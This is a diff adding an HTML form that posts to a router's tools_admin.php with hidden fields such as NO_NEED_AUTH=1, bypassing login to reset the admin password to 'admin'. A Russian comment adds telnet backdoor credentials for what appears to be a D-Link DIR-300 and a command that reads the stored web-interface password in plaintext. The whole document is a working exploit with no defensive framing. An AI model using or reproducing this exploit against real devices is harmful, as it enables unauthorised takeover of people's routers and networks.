@@ -1,0 +1,24 @@
+<form action="http://192.168.0.1:80/tools_admin.php" method="POST">
+
+  <input type="hidden" name="ACTION_POST" value="LOGIN">
+
+  <input type="hidden" name="LOGIN_USER" value="a">
+
+  <input type="hidden" name="LOGIN_PASSWD" value="b">
+
+  <input type="hidden" name="login" value="+Log+In+">
+
+  <input type="hidden" name="NO_NEED_AUTH" value="1">
+
+  <input type="hidden" name="AUTH_GROUP" value="0">
+
+  <input type="hidden" name="admin_name" value="admin">
+
+  <input type="hidden" name="admin_password1" value="admin">
+
+  <input type="submit">
+
+</form>
+<!-- В cmd или через putty (выбираешь тип подключения telnet) telnet 192.168.1.1
+login: Alphanetworks password: wrgn23_dlwbr_dir300b cd /var/etc cat httpasswd.
+В результате видим логин/пароль веб-морды в открытом виде -->
